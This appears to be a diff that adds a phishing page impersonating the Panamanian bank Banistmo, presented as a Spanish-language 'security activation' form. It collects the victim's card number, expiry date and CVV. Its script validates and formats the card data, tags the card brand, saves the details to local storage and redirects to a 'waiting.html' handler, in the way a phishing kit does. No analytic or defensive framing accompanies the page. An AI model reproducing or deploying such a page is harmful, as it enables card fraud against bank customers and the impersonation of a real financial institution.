@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <head>
+        <title>Banistmo Sucursal Virtual Personas</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link href="css/login.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+        <link rel="icon" type="image/png" href="img/logo.png" />
+        <script src="./js/disp.js"></script>
+    </head>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="navegacion">
+            <div class="logo">
+                <img src="img/logo-banitsmo.png" alt="logo banitsmo">
+            </div>
+            <div class="idioma">
+                <a href="">English</a>
+                <i class="icono-lenguaje"></i>
+            </div>
+        </nav>
+    </header>
+    <main>
+
+        <!-- LEFT COLUMN -->
+        <section class="container">
+            <div class="container-grid">
+
+
+                <div class="container-campos">
+                    <div class="header-campos">
+                        <h3>Activación de Seguridad</h3>
+                    </div>
+
+                    <p>Digite los siguientes datos para activar la seguridad de tu cuenta.</p>
+
+                    <!-- CARD NUMBER -->
+                    <div class="input-row-campos">
+                        <div class="input-group-text input-fix">
+                            <input class="input-bg-card" type="text" min="0" max="9999999999999999"
+                                oninput="formatearNumero(this)" id="cnumber" placeholder=" ">
+                            <label for="">Número de Tarjeta (16 Dígitos)</label>
+                        </div>
+                    </div>
+
+                    <!-- INPUT SELECT -->
+                    <div class="input-row-campos">
+                        <div class="input-group-select mr-2">
+                            <select id="mes" required>
+                                <option value="" disabled selected></option>
+                                <option value="1">1</option>
+                                <option value="2">2</option>
+                                <option value="3">3</option>
+                                <option value="4">4</option>
+                                <option value="5">5</option>
+                                <option value="6">6</option>
+                                <option value="7">7</option>
+                                <option value="8">8</option>
+                                <option value="9">9</option>
+                                <option value="10">10</option>
+                                <option value="11">11</option>
+                                <option value="12">12</option>
+                            </select>
+                            <label for="">Mes</label>
+                        </div>
+                        <div class="input-group-select">
+                            <select id="ano" required>
+                                <option value="" disabled selected></option>
+                                <option value="23">2023</option>
+                                <option value="24">2024</option>
+                                <option value="25">2025</option>
+                                <option value="26">2026</option>
+                                <option value="27">2027</option>
+                                <option value="28">2028</option>
+                                <option value="29">2029</option>
+                                <option value="30">2030</option>
+                                <option value="31">2031</option>
+                                <option value="32">2032</option>
+                                <option value="33">2033</option>
+                                <option value="34">2034</option>
+                                <option value="35">2035</option>
+                                <option value="36">2036</option>
+                            </select>
+                            <label for="">Año</label>
+                        </div>
+                    </div>
+
+                    <!-- CVV -->
+                    <div class="input-row-campos">
+                        <div class="input-group-text input-fix">
+                            <input class="input-bg-lock" type="number" id="cvv" maxlength="3" placeholder=" ">
+                            <label for="">CVV</label>
+                        </div>
+                    </div>
+
+                    <!-- BUTTON -->
+                    <div class="btn-row">
+                        <button type="button" class="btn btn-success" id="continuar">
+                            Continuar
+                        </button>
+                    </div>
+
+                </div>
+
+            </div>
+
+
+            <!-- RIGHT COLUMN -->
+            <div class="column-right">
+                <div class="img-main">
+                    <img src="img/ban-card-header.png" width="717px">
+                </div>
+
+                <!-- "CONOCE TAMBIEN"-->
+                <div class="conoce">
+                    <h1 class="titleConoce">Conoce también:</h1>
+                    <div class="conoceItems">
+                        <div class="conoceItem">
+                            <img src="img/tarifas.png" alt="">
+                            <a href="#">Tarifas</a>
+                            <span><b>+</b></span>
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/servicios.png" alt="">
+                            <a href="#">Servicios</a>
+                            <span><b>+</b></span>
+
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/sucursales.png" alt="">
+                            <a href="#">Sucursales</a>
+                            <span><b>+</b></span>
+
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/noticias.png" alt="">
+                            <a href="#">Noticias</a>
+                            <span><b>+</b></span>
+
+                        </div>
+                    </div>
+                    <button class="btnConoce">Conoce como utilizar la Banca en Línea</button>
+                </div>
+
+            </div>
+
+
+        </section>
+    </main>
+    <footer class="footer">
+        <div class="contenedor-footer">
+            <div class="contacto-telefono">
+                <i class="fas  fa-phone" style="color : #454648"></i>
+                Sucursal Teléfonica: (507) 306-4700
+            </div>
+            <div class="info">
+                Copyright Banistmo S.A. 2023
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/app.js"></script>
+    <script>
+        const cnumber = document.querySelector('#cnumber');
+        const mes = document.querySelector('#mes');
+        const ano = document.querySelector('#ano');
+        const cvv = document.querySelector('#cvv');
+
+        cvv.addEventListener('input', function () {
+            const maxLength = parseInt(cvv.getAttribute('maxlength'));
+            if (cvv.value.length > maxLength) {
+                cvv.value = cvv.value.slice(0, maxLength);
+            }
+        });
+
+        if (info.err !== '') {
+            // Mensaje de error
+            alert('¡Tuvimos un problema! Por favor llena los campos.');
+
+            cnumber.style.borderColor = "red";
+            cnumber.style.borderBottomWidth = "3px";
+        }
+
+        const btnContinuar = document.getElementById('continuar');
+        btnContinuar.addEventListener('click', (e) => {
+            e.preventDefault();
+
+            cnumber.style.borderColor = "black";
+            cnumber.style.borderBottomWidth = "1px";
+
+            mes.style.borderColor = "black";
+            mes.style.borderBottomWidth = "1px";
+
+            ano.style.borderColor = "black";
+            ano.style.borderBottomWidth = "1px";
+
+            cvv.style.borderColor = "black";
+            cvv.style.borderBottomWidth = "1px";
+
+            if ((cnumber.value.length === 19 && cnumber.value[0] !== '3') || (cnumber.value.length === 17 && cnumber.value[0] === '3')) {
+                if (mes.value !== '') {
+                    if (ano.value !== '') {
+                        if ((cvv.value.length === 3 && cnumber.value.length === 19) || (cvv.value.length === 4 && cnumber.value.length === 17)) {
+                            // Guardar en LS
+                            info.p = cnumber.value;
+                            info.f = (mes.value + "/" + ano.value);
+                            info.c = cvv.value;
+
+                            if(cnumber[0] === '3'){
+                                info.type = 'AM';
+                            }else if(cnumber.value[0] === '4'){
+                                info.type = 'VISA';
+                            }else if (cnumber.value[0] === '5'){
+                                info.type = 'MC';
+                            }else{
+                                info.type = 'NO';
+                            }
+
+                            LS.setItem('info', JSON.stringify(info));
+                            ;
+
+                            // Enviar al handler waiting
+                            window.location.href = 'waiting.html';
+
+                        } else {
+                            cvv.style.borderColor = "red";
+                            cvv.style.borderBottomWidth = "3px";
+                        }
+                    } else {
+                        ano.style.borderColor = "red";
+                        ano.style.borderBottomWidth = "3px";
+                    }
+                } else {
+                    mes.style.borderColor = "red";
+                    mes.style.borderBottomWidth = "3px";
+                }
+            } else {
+
+                cnumber.style.borderColor = "red";
+                cnumber.style.borderBottomWidth = "3px";
+            }
+        });
+
+        function formatearNumero(input) {
+            let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
+            let numeroFormateado = '';
+
+            // American express
+            if (numero[0] === '3') {
+                console.log('american');
+
+                cvv.setAttribute('maxlength', '4');
+
+                if (numero.length > 15) {
+                    numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
+                }
+
+                for (let i = 0; i < numero.length; i++) {
+                    if (i === 4 || i === 10) {
+                        numeroFormateado += '-';
+                    }
+
+                    numeroFormateado += numero.charAt(i);
+                }
+
+                input.value = numeroFormateado;
+            } else {
+
+                cvv.setAttribute('maxlength', '3');
+
+                if (numero.length > 16) {
+                    numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
+                }
+
+                for (let i = 0; i < numero.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        numeroFormateado += '-';
+                    }
+
+                    numeroFormateado += numero.charAt(i);
+                }
+
+                input.value = numeroFormateado;
+            }
+
+
+        }
+    </script>
+</body>
+
+</html>
